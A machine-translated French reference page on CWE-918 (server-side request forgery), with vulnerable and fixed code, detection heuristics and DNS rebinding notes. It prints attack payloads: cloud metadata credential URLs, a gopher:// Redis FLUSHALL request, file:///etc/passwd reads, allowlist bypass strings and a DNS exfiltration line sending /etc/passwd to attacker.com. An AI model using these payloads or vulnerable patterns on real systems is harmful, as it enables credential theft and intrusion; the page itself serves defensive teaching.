---
description: "CWE-918 : Le serveur effectue des requêtes HTTP ou protocolaires vers des URL contrôlées par l'attaquant, exposant les services internes et les métadonnées cloud, et permettant le protocol smuggling."
date: 2026-04-16
tags: [security, cwe, ssrf, cloud, metadata, internal-network, http-client]
level: Advanced
source_sha256: 4752910557846d55badd3c2304e3442bb0ee1c876b1bcf51f4667b57a95c9d08
translation: machine
translated_at: '2026-10-24'
---
# CWE-918 : Falsification de requête côté serveur (Server-Side Request Forgery) {#cwe-918-server-side-request-forgery}

**CWE-918** | OWASP Top 10 A10:2021 | Score de base CVSS : 5.0 à 9.8 (Critique lorsque les métadonnées cloud sont accessibles) | Rang 19 du Top 25 CWE

## Sémantique fonctionnelle {#functional-semantics}

La SSRF amène le serveur à agir comme un proxy HTTP pour le compte de l'attaquant. L'identité réseau du serveur, ses identifiants IAM et ses relations de confiance deviennent accessibles à l'attaquant. Dans les environnements cloud, le service de métadonnées situé à `169.254.169.254` (AWS IMDSv1, GCP, Azure) expose sans authentification les identifiants de l'instance, ses rôles et sa configuration interne. Dans les environnements on-premise, la SSRF permet de scanner et d'exploiter des services internes qui supposent une sécurité périmétrique.

Il existe deux classes de SSRF : la **SSRF complète** (réponse renvoyée à l'attaquant) et la **SSRF aveugle ou partielle** (aucune réponse, mais des effets de bord se produisent : une résolution DNS confirme l'accessibilité, un POST déclenche un changement d'état, le temps de réponse révèle l'état d'un port).

## Cause racine {#root-cause}

Les applications construisent des URL sortantes à partir de composants contrôlés par l'attaquant (URL complète, nom d'hôte, segment de chemin, adresse IP) sans valider la destination réseau effectivement résolue. Les incohérences d'analyse d'URL entre la couche de validation et la couche client HTTP créent des contournements, même lorsqu'une liste d'autorisation (allowlist) est en place.

## Conditions de déclenchement {#trigger-conditions}

- L'utilisateur fournit une URL pour : la récupération d'image ou de fichier, l'enregistrement d'un webhook, l'aperçu d'URL, la génération de PDF, un callback OAuth, l'import depuis un service externe, un endpoint de health check
- L'application construit une URL à partir d'un nom d'hôte, d'un chemin ou de paramètres de requête fournis par l'utilisateur
- Les paramètres `redirect_uri`, `callback_url`, `next`, `return_to` sont suivis côté serveur sans validation de la destination
- Les services internes n'ont pas d'authentification, car on suppose que seul le réseau interne peut les atteindre

## Écosystèmes concernés {#affected-ecosystems}

| Contexte | Vecteur SSRF courant | Risque |
|---|---|---|
| AWS EC2/Lambda | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Exfiltration d'identifiants, prise de contrôle complète du compte |
| AWS IMDSv2 | Nécessite un PUT et un jeton de session : atténue la SSRF basique | Plus faible (mais reste vulnérable via TOCTOU) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` avec l'en-tête `Metadata-Flavor: Google` | Exfiltration du jeton du compte de service |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` avec `Metadata: true` | Exfiltration du jeton MSI |
| Kubernetes | `https://kubernetes.default.svc/` accessible depuis les pods | Accès à l'API server avec le compte de service du pod |
| Socket Docker | `http://localhost:2375/containers/json` (si exposé) | Évasion de conteneur |
| Services HTTP internes | Redis (`gopher://`), Elasticsearch, Consul, etcd | Accès aux données sans authentification |

## Patterns vulnérables {#vulnerable-patterns}

### SSRF basique : URL contrôlée par l'utilisateur récupérée directement {#basic-ssrf-user-controlled-url-fetched-directly}

```python
# VULNERABLE: attacker sends url=http://169.254.169.254/latest/meta-data/iam/...
import requests
from flask import request, jsonify

@app.route("/fetch-preview")
def fetch_preview():
    url = request.args.get("url")
    resp = requests.get(url, timeout=5)  # no validation, follows redirects by default
    return jsonify({"content": resp.text[:500]})
```

### Protocol smuggling via gopher:// {#protocol-smuggling-via-gopher}

```text
# gopher:// allows arbitrary TCP payloads — can send Redis commands, SMTP, etc.
GET /fetch?url=gopher://internal-redis:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
```

### SSRF partielle : enregistrement de webhook {#partial-ssrf-webhook-registration}

```javascript
// VULNERABLE: attacker registers internal URL as webhook
// No content returned but POST triggers state change in internal service
app.post("/webhooks/register", async (req, res) => {
    const { callbackUrl } = req.body;
    // No validation — attacker uses http://internal-billing-service/admin/reset
    await db.save({ userId: req.user.id, webhook: callbackUrl });
    // Later, on event: axios.post(callbackUrl, eventData)
    res.json({ ok: true });
});
```

### Contournement par analyse d'URL : contournement de la liste d'autorisation {#url-parsing-bypass-allowlist-circumvention}

```python
# VULNERABLE: parseurl and requests disagree on authority
from urllib.parse import urlparse
import requests

ALLOWLIST = {"api.example.com", "cdn.example.com"}

def fetch_safe(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWLIST:
        raise ValueError("Domain not allowed")
    # Bypasses:
    # http://api.example.com@192.168.1.1/ — urlparse.hostname = "api.example.com", requests connects to 192.168.1.1
    # http://api.example.com#@192.168.1.1/ — fragment confusion
    # http://192.168.1.1%2F@api.example.com/ — URL encoding
    return requests.get(url)
```

## Patterns corrigés {#fixed-patterns}

### Liste d'autorisation avec vérification de l'IP après résolution {#allowlist-with-post-resolution-ip-check}

```python
import socket
import ipaddress
import requests
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

# RFC 1918 + link-local + loopback ranges
BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),   # link-local / metadata
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),          # IPv6 ULA
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
    except Exception:
        return False

    # Allowlist by hostname (before DNS resolution)
    if parsed.hostname not in ALLOWED_HOSTS:
        return False

    # Enforce scheme
    if parsed.scheme not in ("http", "https"):
        return False

    # Resolve DNS and check every returned IP
    try:
        infos = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
    except socket.gaierror:
        return False

    for (_fam, _type, _proto, _canon, sockaddr) in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        if any(ip in net for net in BLOCKED_NETWORKS):
            return False

    return True

def fetch_url(url: str):
    if not is_safe_url(url):
        raise PermissionError("URL not allowed")
    # disable_redirects: each redirect must be re-validated
    resp = requests.get(url, allow_redirects=False, timeout=5)
    if resp.status_code in (301, 302, 303, 307, 308):
        return fetch_url(resp.headers["Location"])  # recursive re-validation
    return resp
```

### Application d'IMDSv2 (correctif au niveau de l'infrastructure AWS) {#imdsv2-enforcement-aws-infrastructure-level-fix}

```bash
# Require IMDSv2 — PUT + TTL token required before GET; mitigates most SSRF
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-put-response-hop-limit 1 \
  --http-tokens required
```

### Webhook : refuser les destinations internes dès l'enregistrement {#webhook-deny-internal-destinations-at-registration}

```javascript
const dns = require("dns").promises;
const ipRangeCheck = require("ip-range-check"); // npm: ip-range-check

const BLOCKED_RANGES = [
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "169.254.0.0/16", "127.0.0.0/8", "::1/128"
];

async function validateWebhookUrl(urlStr) {
    const url = new URL(urlStr); // throws on malformed
    if (!["http:", "https:"].includes(url.protocol)) throw new Error("Protocol not allowed");

    const { address } = await dns.lookup(url.hostname);
    if (ipRangeCheck(address, BLOCKED_RANGES)) {
        throw new Error("Internal addresses not allowed for webhooks");
    }
    return true;
}
```

## Heuristiques de détection {#detection-heuristics}

**Déclencheurs de l'analyse statique :**
- `requests.get(url)`, `urllib.request.urlopen(url)`, `httpx.get(url)` où `url` provient des paramètres de la requête
- `axios.get(req.body.url)`, `fetch(req.query.callbackUrl)` : flux direct d'un paramètre vers le client HTTP
- `curl_exec($ch)` après `curl_setopt($ch, CURLOPT_URL, $_GET[...])` en PHP
- `java.net.URL(userInput).openStream()` ou `HttpClient.send()` avec une URI contrôlée par l'utilisateur
- URL construite par concaténation de chaînes : `"http://" + req.params.host + "/api/"`
- `allow_redirects=True` (valeur par défaut de requests) combiné à une URL fournie par l'utilisateur

**Déclencheurs de configuration :**
- IMDSv1 non désactivé sur les instances EC2 (absence de `--http-tokens required`)
- Compte de service de pod disposant de permissions RBAC excessives (SSRF vers l'API Kubernetes)
- API Docker exposée sur `0.0.0.0:2375` (sans TLS, accessible depuis les conteneurs)

**Indicateurs de faux positifs :**
- URL construite à partir d'une liste statique sans composant contrôlé par l'utilisateur (par exemple `WEBHOOK_URL = os.getenv("WEBHOOK_URL"); requests.post(WEBHOOK_URL, data=payload)`) : la variable d'environnement est définie au déploiement et non par l'utilisateur.
- Récupération d'une URL fournie par l'utilisateur où l'IP résolue est forcée hors des plages RFC 1918, où les redirections sont désactivées et où le contenu de la réponse n'est pas renvoyé au demandeur (récupération aveugle à des fins non sécuritaires) : à signaler pour revue, avec une gravité moindre.
- Services de health check internes qui s'appellent eux-mêmes via localhost, de manière intentionnelle.

## DNS rebinding {#dns-rebinding}

Le DNS rebinding contourne les listes d'autorisation basées sur l'IP : le serveur DNS renvoie une IP valide lors de la première résolution (la vérification passe), puis une IP privée lors des résolutions suivantes (utilisée par le client HTTP). Mitigation : résoudre le DNS une seule fois, figer l'IP pour la durée de la connexion et bloquer si l'IP change.

```python
# Pattern to detect: check at validation time, connect at different time
# VULNERABLE sequence:
ip = socket.gethostbyname(hostname)  # returns 93.184.216.34 (valid)
check_ip_not_private(ip)             # passes
time.sleep(0.1)                      # TTL expires, attacker's DNS returns 10.0.0.1
requests.get(f"http://{hostname}/")  # connects to 10.0.0.1
```

## Charges utiles de protocol smuggling {#protocol-smuggling-payloads}

Lorsque le client HTTP prend en charge des schémas non HTTP (curl, Java URL, certaines bibliothèques Python) :

| Schéma | Effet |
|---|---|
| `file:///etc/passwd` | Lecture de fichier local |
| `gopher://redis:6379/_FLUSHALL` | Charge utile TCP arbitraire (Redis, SMTP, FTP) |
| `dict://redis:6379/INFO` | Requête sur le protocole DICT |
| `ftp://internal-ftp/` | Listing de répertoire FTP |
| `http://localhost:9200/_cat/indices` | Elasticsearch via la boucle locale (loopback) |

Correctif : n'autoriser que `http` et `https`, et rejeter tous les autres schémas avant toute connexion.

## Impact de la SSRF partielle {#partial-ssrf-impact}

Même sans corps de réponse renvoyé à l'attaquant :
- **Scan de ports** par mesure du temps : connexion refusée (<10 ms) ou filtrée (timeout) ou ouverte (réponse >0 ms)
- **Exfiltration DNS** via sous-domaine : `http://$(cat /etc/passwd | base64).attacker.com/` dans une chaîne SSTI vers SSRF
- **Modification d'état** par POST vers des endpoints d'administration internes (réinitialisation de mot de passe, purge de cache, déclenchement de job)
- **Injection dans les journaux** en amenant le service interne à journaliser des données contrôlées par l'attaquant

## Voir aussi {#see-also}

- [[cwe-502-deserialization]] : une SSRF vers Redis ou Memcache peut déclencher des chaînes de gadgets de désérialisation
- CWE-020 : Validation des entrées. La validation des URL est le contrôle principal
- CWE-601 : Open Redirect. Une redirection ouverte peut être chaînée pour contourner les listes d'autorisation SSRF (redirection vers l'interne)
- CWE-611 : XML External Entities. Une XXE peut déclencher une SSRF via la récupération d'une entité externe
